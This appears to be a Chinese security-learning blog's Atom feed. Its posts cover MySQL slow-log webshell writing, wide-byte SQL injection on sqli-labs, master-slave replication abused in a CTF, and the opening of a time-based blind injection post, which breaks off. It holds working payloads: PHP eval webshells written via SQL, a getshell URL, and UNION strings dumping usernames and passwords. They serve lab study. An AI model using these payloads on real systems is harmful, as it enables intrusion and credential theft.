<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://hq185187.github.io</id>
    <title>welcome to my blog • Posts by &#34;sql注入&#34; category</title>
    <link href="https://hq185187.github.io" />
    <updated>2023-07-06T08:43:36.682Z</updated>
    <entry>
        <id>https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/</id>
        <title>慢日志注入</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;h4 id=&#34;1-load_file读取函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-load_file读取函数&#34;&gt;#&lt;/a&gt; 1 load_file (): 读取函数&lt;/h4&gt;
&lt;p&gt;MySQL：5.0.96&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2023/07/06/Ok7pmWcXfoEA2TI.png&#34; alt=&#34;屏幕截图 2023-07-06 203810.png&#34;&gt;&lt;br&gt;
%27 是引号&lt;/p&gt;
&lt;h4 id=&#34;2文件写入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2文件写入&#34;&gt;#&lt;/a&gt; 2. 文件写入&lt;/h4&gt;
&lt;p&gt;into outfile: 能写入多行，按格式输出&lt;br&gt;
 into dumpfile: 只能写入一行，没有输出格式&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2023/07/06/bnKqk5r8yRWMumN.png&#34; alt=&#34;屏幕截图 2023-07-06 205301.png&#34;&gt;&lt;br&gt;
&lt;img data-src=&#34;https://s2.loli.net/2023/07/06/vIy8rDcaG9U5nwg.png&#34; alt=&#34;屏幕截图 2023-07-06 205603.png&#34;&gt;&lt;br&gt;
 通过对比也可以看出两种方式的区别&lt;br&gt;
 dumpfile 没有输出格式，只能输出一行（这里没有体现）&lt;/p&gt;
&lt;p&gt;6.34 版本以后，secure_file_priv&lt;br&gt;
 的值为 NULL, 并且无法用 SQL 语句对其修改&lt;br&gt;
 secure_file_priv 参数是用来限制 LOAD DATA,SELECT…INTO OUTFILE 语句和 LOAD_FILE () 函数等等&lt;br&gt;
当它的值为空时，表示不限制 MySQL 的导入 / 导出&lt;br&gt;
当它的值为 null 时，表示不允许 MySQL 导入导出&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;show variables like &amp;#x27;%secure_file_priv%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;先本地连接 MySQL:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mysql.exe -u root -p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输入密码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;当查询语句的时间超过系统默认的时间时，该语句会被记入慢查询日志。一般都是通过 long_query_time 选项设置，以秒为单位。查看默认的时间：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;show global variables like &amp;#x27;%long_query_time%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我这里是 10s&lt;/p&gt;
&lt;p&gt;开启慢查询:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;set global slow_query_log=1;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;查看参数:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SHOW VARIABLES like &amp;#x27;%slow_query_log%&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时如果有文件包含的点，我们可以 getshell&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=$_GET[&amp;#x27;a&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b=include($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $b;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 MySQL 命令行中，向日志文件写入 shell:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;select &amp;#x27;&amp;lt;?php eval($_GET[X])?&amp;gt;&amp;#x27; or sleep(11);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;直接 getshell:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/webtest/1.php?a=D:\phpstudy_pro\Extensions\MySQL5.7.26\data\laptop-slow.log&amp;amp;X=phpinfo();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2023/07/06/Zs6HIdUKg2VFB8r.png&#34; alt=&#34;屏幕截图 2023-07-06 162417.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;就算没有文件包含的点，我们也可以 getshell&lt;br&gt;
 将日志文件位置改为能访问的文件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SET GLOBAL slow_query_log_file=&amp;#x27;D:\phpstudy_pro\WWW\shell.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时在 MySQL 命令行添加 shell 日志&lt;br&gt;
 &lt;code&gt;select &#39;&amp;lt;?php eval($_GET[shell])?&amp;gt;&#39; or sleep(11);&lt;/code&gt; &lt;br&gt;
 直接可以在 shell.php 里面 getshell&lt;/p&gt;
</content>
        <updated>2023-07-06T08:43:36.682Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
        <title>宽字节注入学习</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;h3 id=&#34;先介绍几个函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#先介绍几个函数&#34;&gt;#&lt;/a&gt; 先介绍几个函数&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;addslashes：在预定义字符（单引号，双引号，反斜杠，NULL）前加反斜杠&lt;/li&gt;
&lt;li&gt;mysql_real_escape_string：转义 SQL 语句中使用的字符串中的特殊字符 ( &lt;code&gt;\x00,\n,\r,\,&#39;,&amp;quot;,\x1a&lt;/code&gt; )&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
&lt;p&gt;窄字节：字符大小为一个一个字节&lt;br&gt;
宽字节：字符大小为两个字节&lt;br&gt;
所有英文默认占一个字节，汉字占两个字节&lt;br&gt;
常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS&lt;/p&gt;
&lt;p&gt;当数据库用 GBK 编码而 PHP 用 UTF-8 编码，当防止 SQL 注入的上面的函数发挥作用，在单双引号前加了反斜杠 &lt;code&gt;\&lt;/code&gt; 。假如我们在单双引号前加一个字符，使其和斜杠组合成一个汉字，从而保留单双引号，使其发挥作用。&lt;br&gt;
注意：&lt;br&gt;
添加的字符 ASCII 要大于 128，两个字符才能组合成汉字，因为前一个 ascii 码要大于 128，才到汉字的范围 ，这一点需要注意，经典的有 % df&lt;/p&gt;
&lt;p&gt;例子：Sqli-labs32 关&lt;br&gt;
输入 1‘会被转义成 &lt;code&gt;1\&#39;&lt;/code&gt; &lt;br&gt;
 输入 1% df’%23 就可以成功回显&lt;br&gt;
然后就是常规的字符型注入&lt;br&gt;
爆表：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/?id=-1%df&amp;#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆列名：（这里表名要用 16 进制）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1%df&amp;#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆字段：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1%df&amp;#x27; union select 1,2,group_concat(username,0x7e,password)from users%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <updated>2023-06-29T10:06:07.947Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</id>
        <title>Mysql主从复制</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/"/>
        <content type="html">&lt;h2 id=&#34;原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h2&gt;
&lt;p&gt;简单说就是主服务器上执行的语句，从服务器也执行了相同的语句，主服务器的操作在从服务器上产生了相同的效果&lt;/p&gt;
&lt;p&gt;过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;master（主数据库）将用户对数据库的更新操作以二进制格式保存进 BinaryLog 日志文件中&lt;/li&gt;
&lt;li&gt;slave (从数据库) 的 I/O 进程读取主数据库的二进制日志文件&lt;/li&gt;
&lt;li&gt;slave 将接收到的日志内容添加到 relay-kog，从数据库的 SQL 进程检测新的日志内容解析并执行&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/20201102143527123.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNzg2Mjg1,size_16,color_FFFFFF,t_70#pic_center&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;配置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置&#34;&gt;#&lt;/a&gt; 配置&lt;/h2&gt;
&lt;p&gt;master：192.168.81.122(kali)&lt;br&gt;
slave：192.168.81.113(ubuntu)&lt;/p&gt;
&lt;h3 id=&#34;master配置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#master配置&#34;&gt;#&lt;/a&gt; Master 配置：&lt;/h3&gt;
&lt;p&gt;命令行进入 MySQL:&lt;br&gt;
 &lt;code&gt; mysql -u root -p&lt;/code&gt; &lt;br&gt;
 接着输入密码，然后创建用户：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;//root和root是从服务器器(slave)的数据库用户名和密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GRANT REPLICATION SLAVE ON *.* to &amp;#x27;root&amp;#x27;@&amp;#x27;192.168.81.113&amp;#x27; identified by &amp;#x27;root&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//刷新系统权限表的配置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flush privileges;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;找到 mysql 的配置文件 /etc/my.conf, 增加以下配置&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#开启binlog&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log-bin=mysql-bin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;server-id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#需要同步的数据库,如果不配置则同步所以数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binlog-do-db=mysql_test&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#binlog日志保留的天数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;expire-logs-days=10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置完成后重启 mysql:&lt;br&gt;
service mysql restart&lt;br&gt;
 查看当前 binlog 日志的信息&lt;br&gt;
 &lt;code&gt;show master status\G&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;mysql-bin.000002&lt;/p&gt;
&lt;h3 id=&#34;slave配置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#slave配置&#34;&gt;#&lt;/a&gt; slave 配置&lt;/h3&gt;
&lt;p&gt;找到 /etc/my.cnf 配置文件，增加以下配置:&lt;br&gt;
 &lt;code&gt;server-id=2&lt;/code&gt; &lt;br&gt;
 接着用命令行登录到 mysql 服务器:&lt;br&gt;
 &lt;code&gt;mysql -u root -p&lt;/code&gt; &lt;br&gt;
 进入 MySQL 后输入以下命令:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;CHANGE MASTER TO &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MASTER_HOST=&amp;#x27;192.168.81.122&amp;#x27;,//主机IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MASTER_USER=&amp;#x27;root&amp;#x27;,//之前创建的用户账号&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MASTER_PASSWORD=&amp;#x27;root&amp;#x27;,//之前创建的用户密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MASTER_LOG_FILE=&amp;#x27;mysql-bin.000002&amp;#x27;,//master主机的binlog日志名称&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;MASTER_LOG_POS=862,//binlog日志偏移量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;master_port=3306;//端口&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;启动 slave 服务:&lt;br&gt;
 &lt;code&gt;start slave;&lt;/code&gt; &lt;br&gt;
 查看是否启动成功:&lt;br&gt;
 &lt;code&gt;show slave status\G&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;测试主从复制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#测试主从复制&#34;&gt;#&lt;/a&gt; 测试主从复制&lt;/h2&gt;
&lt;p&gt;在 maser 主机执行:&lt;/p&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;CREATE TABLE `tb_commodity_info` (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  `id` varchar(32) NOT NULL,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  `commodity_name` varchar(512) DEFAULT NULL COMMENT &amp;#x27;商品名称&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  `commodity_price` varchar(36) DEFAULT &amp;#x27;0&amp;#x27; COMMENT &amp;#x27;商品价格&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  `number` int(10) DEFAULT &amp;#x27;0&amp;#x27; COMMENT &amp;#x27;商品数量&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  `description` varchar(2048) DEFAULT &amp;#x27;&amp;#x27; COMMENT &amp;#x27;商品描述&amp;#x27;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  PRIMARY KEY (`id`)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT=&amp;#x27;商品信息表&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;此时看从数据库的结构&lt;/p&gt;
&lt;h2 id=&#34;例题2023安洵杯-confronting-robots&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#例题2023安洵杯-confronting-robots&#34;&gt;#&lt;/a&gt; 例题：2023 安洵杯 Confronting robots&lt;/h2&gt;
&lt;p&gt;前面都能用 sqlmap 扫出来直接到最后一步主从复制&lt;br&gt;
查看数据库版本：&lt;br&gt;
select version();&lt;br&gt;
 在自己 vps 上起一个相同版本的 mariadb，修改默认配置文件 vim /etc/mysql/my.cnf 允许远程访问并启用二进制日志&lt;br&gt;
 server-id = 1 log_bin = /var/log/mysql/mariadb-bin&lt;br&gt;
service mysql restart&lt;br&gt;
 自己的 vps 作为主，题目环境作为从&lt;br&gt;
主服务器执行&lt;br&gt;
 CREATE USER ‘atest’@’%’ IDENTIFIED BY ‘testtest’;&lt;br&gt;
grant replication slave on . to ‘atest’@’%’;&lt;br&gt;
flush privileges; 使用 select database (); show tables; desc game; 等查询命令将从服务器上的数据库结构一比一复刻到&lt;br&gt;
主服务器上 CREATE DATABASE IF NOT EXISTS game_data;&lt;br&gt;
use game_data&lt;br&gt;
CREATE TABLE IF NOT EXISTS game ( round int(20) , choice varchar(256) ) ;&lt;br&gt;
 在主服务器 mysql 中执行 show master status; 记录下来 File 和 Position mysql-bin.000001 1376&lt;br&gt;
 在从服务器 (题目环境) 命令框中输入&lt;br&gt;
 CHANGE MASTER TO MASTER_HOST=‘主服务器 ip’, MASTER_USER=‘atest’,&lt;br&gt;
MASTER_PASSWORD=‘testtest’, MASTER_LOG_FILE=‘mariadb-bin.000001 (记录的值)’,MASTER_LOG_POS=1365 (记录的值);&lt;br&gt;
start slave;&lt;br&gt;
show slave status;&lt;br&gt;
 显示这个表示成功连接上&lt;br&gt;
主服务器中执行&lt;br&gt;
 INSERT INTO game (round , choice) VALUES (‘1’, ‘R’), (‘2’, ‘R’),(‘3’, ‘R’), (‘4’, ‘R’),(‘5’, ‘R’), (‘6’, ‘R’),(‘7’,‘R’), (‘8’, ‘R’),(‘9’, ‘R’), (‘10’, ‘R’);&lt;/p&gt;
&lt;p&gt;在开始挑战处输入对应的答案得到 flag&lt;/p&gt;
</content>
        <updated>2023-06-21T03:09:09.169Z</updated>
    </entry>
    <entry>
        <id>https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</id>
        <title>时间盲注</title>
        <link rel="alternate" href="https://hq185187.github.io/2023/05/07/sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
        <content type="html">&lt;p&gt;例子的表:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;id&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;name&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;url&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;alexa&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;country&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;Google&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZ29vZ2xlLmNtLw==&#34;&gt;https://www.google.cm/&lt;/span&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;1&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;USA&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;2&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;淘宝&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudGFvYmFvLmNvbS8=&#34;&gt;https://www.taobao.com/&lt;/span&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;13&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;CN&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;3&lt;/td&gt;
